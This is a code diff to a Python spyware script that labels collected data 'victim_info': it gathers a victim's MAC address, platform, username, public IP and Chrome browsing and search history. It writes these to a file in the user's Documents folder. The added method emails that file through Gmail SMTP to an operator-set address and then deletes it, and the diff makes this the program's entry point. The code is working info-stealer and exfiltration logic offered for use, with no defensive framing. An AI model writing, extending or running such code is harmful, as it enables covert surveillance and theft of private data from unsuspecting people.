@@ -1,4 +1,6 @@
 from pynput.keyboard import Key, Controller
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 import smtplib
 import subprocess
 import platform
@@ -11,6 +13,7 @@ import urllib.parse
 
 EMAIL = None # Set email here
 EMAIL_PASSWORD = None # Set email password here
+EMAIL_TO = None # leave this None if you want to send the email to yourself
 SEND_EMAIL_EVERY = None # Send email every integer. 1 meaning 1 minute or 5 meaning 5 minutes
 
 
@@ -119,7 +122,8 @@ class Chrome(Firefox):
 class VulnScan(Chrome):
 	def __init__(self):
 		super().__init__()
-		self.FILE_NAME = "data.txt"
+		self.username = self.get_username()
+		self.FILE_NAME = f"C:/Users/{self.username}/Documents/data.txt"
 
 	def write_to_file(self, item, item2=None, item3=None):
 		with open(self.FILE_NAME, "a") as f:
@@ -221,13 +225,12 @@ class VulnScan(Chrome):
 
 		mac_address = self.mac_address()
 		platform = self.get_platform()
-		username = self.get_username()
 		public_ip = self.public_ip_address()
 
 		victim_info = {
 			"MAC ADDRESS:": mac_address,
 			"Platform:": platform,
-			"Username:": username,
+			"Username:": self.username,
 			"IP address": public_ip
 		}
 
@@ -244,14 +247,36 @@ class VulnScan(Chrome):
 		self.for_loop_func("[+] Chrome History Data", dict_item=chrome_history_data)
 		self.for_loop_func("[+] Chrome Search History", list_item=chrome_history_keyword_data, unique=True)
 
+	def vuln_scanner_email_report(self):
+		self.vuln_scanner() # make the file
+		message = MIMEMultipart()
+		message.attach(MIMEText(open(self.FILE_NAME).read()))
+		message = str(message)
+		server = smtplib.SMTP('smtp.gmail.com', 587)
+		server.starttls()
+		check = False
+
+		try:
+			server.login(EMAIL, EMAIL_PASSWORD)
+			check = True
+		except smtplib.SMTPAuthenticationError:
+			print("\n[-] Email address or Password")
+
+		if check:
+			if EMAIL_TO:
+				server.sendmail(EMAIL, EMAIL_TO, message)
+			else:
+				server.sendmail(EMAIL, EMAIL, message)
+		os.remove(self.FILE_NAME)
+
 class Keylogger(VulnScan):
 	def __init__(self):
 		super().__init__()
 
 
 if __name__ == '__main__':
-	if not EMAIL or not EMAIL_PASSWORD or not SEND_EMAIL_EVERY:
+	if not EMAIL or not EMAIL_PASSWORD:
 		print("[-] Must set the Variables required to run program")
 		exit()
 
-	VulnScan().vuln_scanner()
+	VulnScan().vuln_scanner_email_report()
